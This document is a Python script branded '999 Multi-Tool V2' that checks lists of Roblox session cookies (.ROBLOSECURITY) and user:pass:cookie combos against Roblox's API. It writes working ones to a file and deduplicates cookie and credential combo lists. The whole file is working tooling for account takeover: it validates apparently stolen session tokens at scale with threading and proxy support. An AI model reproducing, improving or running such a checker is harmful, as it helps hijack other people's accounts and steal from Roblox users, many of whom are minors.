#developed by TrioHCF#0999

#start
import time, ctypes, threading, random, traceback, sys, datetime, json, os, subprocess, requests
from threading import Thread
from colorama import Fore, init, Back, Style
init(convert=True)
lock = threading.Lock()
ctypes.windll.kernel32.SetConsoleTitleW(f"999 Multi-Tool V2 MULTI-TOOL | DEVELOPED BY TrioHCF#0999")
print(Fore.RED + '''
 ________ ________ ________    _____   ____ ___ ___    ______________         __________________  ________   ___     
/   __   \   __   \   __   \  /     \ |    |   \   |   \__    ___/   |        \__    ___/_____  \ \_____  \ |   |    
\____    /____    /____    / /  \ /  \|    |   /   |     |    |  |   |  ______  |    |   /   |   \ /   |   \|   |    
   /    /   /    /   /    / /    \    \    |  /|   |___  |    |  |   | /_____/  |    |  /    |    \    |    \   |___ 
  / ___/   / ___/   / ___/  \____/\_  /______/ |______ \ |____|  |___|          |____|  \_______  /_______  /______|
  ''')




time.sleep(1)
req = requests.Session()

#formatting
try:
    os.system("cls")
    format = int(input("\n[999 Multi-Tool] ─ Cookie format:\n\n[1] user:pass:cookie\n[2] cookie\n"))
except:
    print(Fore.RED + "[999 Multi-Tool] ─ You did not enter a valid option -- exitting program")
cookies = open('cookies.txt','r').read().splitlines()
if format == 1:
    try:
        cookies = [cookie.split(':',2)[2] for cookie in cookies]
    except:
        print("\n[999 Multi-Tool] ─ Your cookies are not formatted like this or there were no cookies found in cookies.txt, please restart the program")
        time.sleep(20)
        sys.exit()
elif format == 2:
    cookies = ['_|'+line.split('_|')[-1] for line in cookies]
    os.system("cls")
else:
    print("Not a valid option, exiting program")
    time.sleep(20)
    sys.exit()



proxies = open('proxies.txt','r').read().splitlines()
proxies = [{'https':'http://'+proxy} for proxy in proxies]



if len(proxies) == 0:
    print(Fore.RED + "[999 Multi-Tool] ─ WARNING - You have no proxies loaded - certain tools may not function as intended\n")
    os.system("cls")
if len(cookies) == 0:
    print(Fore.RED + "\n[999 Multi-Tool] ─ WARNING - You have no cookies loaded - certain tools may not function as intended\n")
    os.system("cls")

#functions

def cookie_check(i):
    global valid, invalid, checked, lock
    req = requests.Session()
    checked += 1
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('https://www.roblox.com/mobileapi/userinfo')
        if 'mobileapi/user' in r.url:
            f = open("valid.txt","a+")
            f.write(f"{i}\n")
            valid += 1
            with lock:
                print(Fore.GREEN + "[999 Multi-Tool] ─ Valid Cookie Found")
        else:
            invalid += 1
            with lock:
                print(Fore.RED + "[999 Multi-Tool] ─ Invalid Cookie Found")
            return True
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")
    except:
        cookies.append(i)
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")

def duplicate_cookie_checker():
    global cookies, dupes
    checked = []
    count = 0
    r = open("valid.txt","a+")
    for cookie in cookies:
        if cookie in checked:
            with lock:
                print("[Hell] ─ Found Duped Cookie - Removing Cookie")
            dupes+=1
        else:
            checked.append(cookie)
            r.write(f"{cookie}\n")

        count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Checked {count}/{len(cookies)} cookies | Dupes Found: {dupes}")



def duplicate_combo_checker():
    global combos, dupes
    open("valid.txt","w+").close()
    checked = []
    count = 0
    r = open("valid.txt","a+")
    combos = open("combos.txt","r").read().splitlines()
    for combo in combos:
        if combo in checked:
            with lock:
                print("[Hell] ─ Found Duped Combo - Removing Combo")
            dupes+=1
        else:
            checked.append(combo)
            r.write(f"{combo}\n")
        count+=1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Checked {count}/{len(combos)} combos | Dupes Found: {dupes}")


print(Fore.RED + "[1] Cookie Checker")
print(Fore.RED + "[2] Duplicate Cookie/Combo Checker")
print(Fore.RED + "[3] Favorite Bot")

try:
    option = int(input("\n[999 Multi-Tool] ─ Enter number of tool that you'd like to use: "))
except:
    print(Fore.RED + "[999 Multi-Tool] ─ You did not enter a valid option -- exitting program")
    time.sleep(30)
    sys.exit()



open('valid.txt', 'w+').close()
if option == 1:
    print("\n[999 Multi-Tool] ─ Note that this option doesn't need proxies")
    invalid = 0
    valid = 0
    checked = 0
    print("[999 Multi-Tool] ─ Beginning checks for valid cookies")
    ts = []
    for i in cookies:
        t = threading.Thread(target=cookie_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if valid == 0:
        print(Fore.RED + "[999 Multi-Tool] ─ No valid cookies were found")
    print(Fore.GREEN + "[999 Multi-Tool] ─ All cookies have been checked and the working ones have been written to valid.txt")
elif option == 2:
    print("\n[Hell] ─ Note that this option doesn't need proxies")
    dupes = 0
    type = int(input("\n[1] Combos\n[2] Cookies\nEnter option of what you're checking for dupes: "))
    if type == 1:
        print("[Hell] ─ Ensure you have your combos loaded in the format user:pass in combos.txt")
    elif type == 2:
        print("[Hell] ─ Ensure you have your cookies loaded in the cookies.txt file")
    print("[Hell] ─ Checking is beginning...")
    if type == 2:
        duplicate_cookie_checker()
        print(Fore.GREEN + "[Hell] ─ Version with non dupes can be found in valid.txt")
    elif type == 1:
        duplicate_combo_checker()
        print(Fore.GREEN + "[Hell] ─ Version with non dupes can be found in valid.txt")
else:
    print(Fore.RED + "[999 Multi-Tool] ─ You picked an invalid option -- exitting program")
    time.sleep(30)
    sys.exit()




























time.sleep(100)
sys.exit()
